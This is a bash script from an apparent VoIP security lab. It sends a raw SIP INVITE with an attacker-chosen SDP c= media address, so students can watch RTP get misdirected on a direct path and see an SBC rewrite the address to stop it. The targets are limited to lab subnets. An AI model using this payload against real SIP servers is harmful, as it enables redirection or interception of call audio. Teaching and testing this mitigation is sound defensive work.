#!/usr/bin/env bash
# SOVOC M3 — send a raw SDP offer and read the answer (Labs 3.1 / 3.3).
# Usage: sdp-offer.sh [target] [bogus-c-addr]
#   Default target = trunk-sim (172.28.10.30), which answers with an SDP.
#   The offer carries an attacker-chosen c= line so you can watch where RTP is told to go.
#
# Compare two paths (the T9 lesson):
#   - direct to trunk-sim  -> the bogus c= is honoured (attack: RTP misdirected)
#   - via the edge-sbc     -> rtpengine rewrites c= to its own address (mitigation)
# The anchored path completes end-to-end once trunk routing exists (M9); today this shows the
# offer/answer mechanics and the un-anchored redirect.
set -u
COMPOSE="${COMPOSE:-docker compose}"
cd "$(dirname "$0")/../.." || exit 3
TARGET="${1:-172.28.10.30}"
BOGUS_C="${2:-172.28.10.99}"

case "$TARGET" in
  172.28.10.*|172.28.20.*|172.28.40.*) ;;
  *) echo "REFUSED: $TARGET is outside the lab."; exit 2 ;;
esac

echo "[sdp-offer] INVITE -> $TARGET with c=IN IP4 $BOGUS_C (attacker-chosen media address)"
echo "[sdp-offer] read the answer's c=/m= lines below: where is RTP told to flow?"
MSG='INVITE sip:svc@'"$TARGET"' SIP/2.0\r\nVia: SIP/2.0/UDP 172.28.10.40:5060;branch=z9hG4bK-sdp\r\nMax-Forwards: 70\r\nFrom: <sip:tester@172.28.10.40>;tag=sdp\r\nTo: <sip:svc@'"$TARGET"'>\r\nCall-ID: sdp-offer-$$\r\nCSeq: 1 INVITE\r\nContact: <sip:tester@172.28.10.40>\r\nContent-Type: application/sdp\r\nContent-Length: 129\r\n\r\nv=0\r\no=att 1 1 IN IP4 172.28.10.40\r\ns=x\r\nc=IN IP4 '"$BOGUS_C"'\r\nt=0 0\r\nm=audio 40000 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000\r\n'
$COMPOSE exec -T client sh -c "printf '$MSG' | ncat -u -w3 $TARGET 5060" 2>/dev/null | sed 's/\r$//'
echo "[sdp-offer] (no ACK sent; the UAS will retransmit its 200 harmlessly)"
